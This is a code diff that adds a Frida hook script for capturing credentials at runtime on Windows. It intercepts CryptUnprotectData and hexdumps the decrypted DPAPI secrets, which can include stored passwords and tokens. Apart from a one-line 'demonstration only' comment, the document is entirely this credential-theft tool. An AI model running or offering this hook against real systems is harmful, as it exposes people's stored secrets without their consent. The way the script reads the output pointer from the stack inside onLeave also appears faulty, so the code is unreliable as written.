@@ -1,0 +1,24 @@
+// Frida hook for runtime credential capture
+// ONLY for demonstration in a controlled environment
+
+Interceptor.attach(
+    Module.findExportByName("crypt32.dll", "CryptUnprotectData"),
+    {
+        onLeave: function(retval) {
+            if (retval.toInt32() !== 0) {
+                // Read the output DATA_BLOB
+                var pBlob = this.context.rsp.add(0x40).readPointer();
+                var cbData = pBlob.readU32();
+                var pbData = pBlob.add(8).readPointer();
+                if (cbData > 0 && cbData < 4096) {
+                    var data = pbData.readByteArray(cbData);
+                    console.log("[DPAPI] Decrypted: " + cbData + " bytes");
+                    console.log(hexdump(data, {
+                        offset: 0, length: Math.min(cbData, 128),
+                        header: true, ansi: true
+                    }));
+                }
+            }
+        }
+    }
+);
